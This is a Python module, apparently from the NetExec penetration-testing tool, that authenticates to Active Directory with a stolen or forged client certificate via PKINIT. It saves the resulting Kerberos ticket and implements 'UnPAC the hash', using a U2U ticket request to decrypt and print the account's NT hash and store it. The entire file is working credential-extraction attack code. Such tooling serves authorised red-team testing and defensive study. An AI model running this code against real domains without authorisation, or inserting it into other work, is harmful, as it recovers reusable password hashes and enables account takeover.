# Certificate authentication for nxc: PKINIT (RFC 4556) through impacket, plus UnPAC the hash
#
# References:
#     PKINIT: https://www.rfc-editor.org/rfc/rfc4556
#     U2U: https://tools.ietf.org/html/draft-ietf-cat-user2user-02
#
# Authors:
#  Azox (@azoxlpf) for the PKINIT implementation, in impacket and in nxc
#  Dirk-jan Mollema (@_dirkjan) for the original UnPAC the hash implementation

import base64
import datetime
import os
import random
import tempfile

from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from pyasn1.type.univ import noValue

from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.krb5 import constants
from impacket.krb5.asn1 import AD_IF_RELEVANT, AP_REQ, AS_REP, Authenticator, EncTicketPart, TGS_REP, TGS_REQ, Ticket as TicketAsn1, seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import InvalidChecksum, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import NTLM_SUPPLEMENTAL_CREDENTIAL, PACTYPE, PAC_CREDENTIAL_DATA, PAC_CREDENTIAL_INFO, PAC_INFO_BUFFER
from impacket.krb5.pkinit import PKINITCredentials, PKINITError, getKerberosTGTPKINIT
from impacket.krb5.types import KerberosTime, Principal, Ticket

from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH, TMP_PATH


def pkinit_credentials(args):
    """Load the client certificate and its private key as the PKINIT credentials impacket expects"""
    if args.pfx_cert:
        return PKINITCredentials.fromPFX(args.pfx_cert, args.pfx_pass)

    if args.pfx_base64:
        with open(args.pfx_base64, "rb") as pfx_base64_file:
            pfxdata = base64.b64decode(pfx_base64_file.read())
        return PKINITCredentials.fromPFXData(pfxdata, args.pfx_pass, source=f"the base64 PFX file {args.pfx_base64}")

    if args.pem_cert and args.pem_key:
        return PKINITCredentials.fromPEM(args.pem_cert, args.pem_key, args.pfx_pass)

    return None


def read_nt_hash_from_pac(connection, enc_ticket_part, reply_key):
    """Return the NT hash held by the PAC_CREDENTIAL_INFO of a ticket, or None when the PAC carries none"""
    decoded_ticket_part = decoder.decode(enc_ticket_part, asn1Spec=EncTicketPart())[0]
    ad_if_relevant = decoder.decode(decoded_ticket_part["authorization-data"][0]["ad-data"], asn1Spec=AD_IF_RELEVANT())[0]
    pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())

    buffers = pac_type["Buffers"]
    for _ in range(pac_type["cBuffers"]):
        info_buffer = PAC_INFO_BUFFER(buffers)
        buffers = buffers[len(info_buffer):]
        connection.logger.debug(f"PAC buffer type {info_buffer['ulType']}")
        if info_buffer["ulType"] != 2:   # PAC_CREDENTIAL_INFO
            continue

        credential_info = PAC_CREDENTIAL_INFO(pac_type["Buffers"][info_buffer["Offset"] - 8:][:info_buffer["cbBufferSize"]])
        cipher = _enctype_table[credential_info["EncryptionType"]]
        # Key usage 16: the PAC credential info, encrypted with the AS reply key
        credential_data = cipher.decrypt(reply_key, 16, credential_info["SerializedData"])
        serialization_header = TypeSerialization1(credential_data)
        # Skip the 4 bytes of the ReferentID of the pointer following the header
        credentials = PAC_CREDENTIAL_DATA(credential_data[len(serialization_header) + 4:])
        for credential in credentials["Credentials"]:
            supplemental_credential = NTLM_SUPPLEMENTAL_CREDENTIAL(b"".join(credential["Credentials"]))
            return hexlify(supplemental_credential["NtPassword"]).decode()

    connection.logger.fail("The PAC holds no PAC_CREDENTIAL_INFO: the account has no NT hash stored, or the TGT did not come from PKINIT")
    return None


def unpac_the_hash(connection, username, tgt, cipher, reply_key, session_key):
    """Recover the NT hash of the account the TGT belongs to, through a U2U service ticket to itself

    Only a PKINIT AS-REP carries a PAC_CREDENTIAL_INFO, and the KDC encrypts it with the AS reply key,
    which the TGT does not expose: it has to be read from a ticket requested with that very TGT
    """
    decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(decoded_tgt["ticket"])
    realm = str(decoded_tgt["crealm"])
    now = datetime.datetime.now(datetime.UTC)

    client_name = Principal()
    client_name.from_asn1(decoded_tgt, "crealm", "cname")

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = realm
    seq_set(authenticator, "cname", client_name.components_to_asn1)
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)
    connection.logger.debug(f"U2U authenticator: {authenticator.prettyPrint()}")

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", ticket.to_asn1)
    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    # Key usage 7: the AP-REQ authenticator of a PA-TGS-REQ, encrypted with the TGT session key
    ap_req["authenticator"]["cipher"] = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)

    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)

    req_body = seq_set(tgs_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.canonicalize.value, constants.KDCOptions.enc_tkt_in_skey.value])
    req_body["realm"] = realm
    seq_set(req_body, "sname", Principal(username, type=constants.PrincipalNameType.NT_UNKNOWN.value).components_to_asn1)
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
    seq_set_iter(req_body, "additional-tickets", (ticket.to_asn1(TicketAsn1()),))

    connection.logger.info("Requesting a U2U service ticket to ourselves to read the PAC")
    response = sendReceive(encoder.encode(tgs_req), connection.domain, connection.kdcHost)
    tgs_rep = decoder.decode(response, asn1Spec=TGS_REP())[0]
    connection.logger.debug(f"U2U TGS-REP: {tgs_rep.prettyPrint()}")

    # Key usage 2: with enc-tkt-in-skey the ticket is encrypted with the session key of the TGT sent along
    enc_ticket_part = cipher.decrypt(session_key, 2, tgs_rep["ticket"]["enc-part"]["cipher"])
    return read_nt_hash_from_pac(connection, enc_ticket_part, reply_key)


def pfx_auth(self):
    """Authenticate with a client certificate through PKINIT, then optionally unPAC the NT hash"""
    username = self.args.username[0]
    if not self.kdcHost:
        self.logger.fail(f"Could not resolve KDC host for domain {self.domain}. Use --kdcHost to specify the domain controller IP")
        return False

    self.logger.info("Loading certificate and key from file")
    try:
        credentials = pkinit_credentials(self.args)
    except FileNotFoundError as e:
        self.logger.fail(f"Certificate or key file not found: {e.filename}")
        return False
    except (PKINITError, ValueError) as e:
        self.logger.fail(f"Failed to load certificate/key: {e}")
        return False

    if credentials is None:
        self.logger.fail("You must either specify a PFX file + optional password or a combination of Cert PEM file and Private key PEM file")
        return False

    self.logger.info(f"Requesting TGT for {username}@{self.domain} with the certificate")
    client_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    try:
        tgt, cipher, reply_key, session_key = getKerberosTGTPKINIT(client_name, self.domain, credentials, kdcHost=self.kdcHost)
    except (PKINITError, KerberosError, OSError) as e:
        self.logger.fail(f"Failed to get a TGT with the certificate: {e}")
        return False

    ccache = CCache()
    ccache.fromTGT(tgt, reply_key, session_key)
    basename = sanitize_path_component(f"{self.hostname}_{self.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}-{username}.ccache")
    ccache_path = os.path.normpath(os.path.expanduser(os.path.join(NXC_PATH, "logs", basename)))
    ccache.saveFile(ccache_path)
    self.logger.info(f"Saved TGT to {ccache_path}")

    # Impacket reads the TGT of a Kerberos login from the cache this variable points at, for the whole process
    os.environ["KRB5CCNAME"] = ccache_path
    self.use_kcache = True
    logged_in = self.kerberos_login(self.domain, username, "", "", "", self.kdcHost, True)

    if self.unpac:
        try:
            nthash = unpac_the_hash(self, username, tgt, cipher, reply_key, session_key)
        except (KerberosError, InvalidChecksum, PyAsn1Error, OSError, IndexError, KeyError) as e:   # IndexError: empty AD-IF-RELEVANT, KeyError: unknown etype
            self.logger.fail(f"Failed to unPAC the hash: {e}")
            return logged_in
        if nthash:
            self.logger.highlight(f"{self.domain}\\{username} NT hash: {nthash}")
            self.db.add_credential("hash", self.domain, username, nthash)

    return logged_in


def certificate_options(args):
    """Return the LDAPConnection certificate options for the command line material, plus a temporary file the caller must delete."""
    if args.pfx_cert:
        return {"pfxfile": args.pfx_cert, "pfxpass": args.pfx_pass}, None

    if args.pem_cert and args.pem_key:
        return {"certfile": args.pem_cert, "keyfile": args.pem_key}, None

    if args.pfx_base64:
        with open(args.pfx_base64, "rb") as pfx_base64_file:
            pfxdata = base64.b64decode(pfx_base64_file.read())
        # impacket loads the bundle from a path, so the decoded PFX has to hit the disk
        handle, pfx_path = tempfile.mkstemp(suffix=".pfx", dir=TMP_PATH)
        with os.fdopen(handle, "wb") as pfx_file:
            pfx_file.write(pfxdata)
        return {"pfxfile": pfx_path, "pfxpass": args.pfx_pass}, pfx_path

    raise ValueError("You must either specify a PFX file + optional password or a combination of Cert PEM file and Private key PEM file")
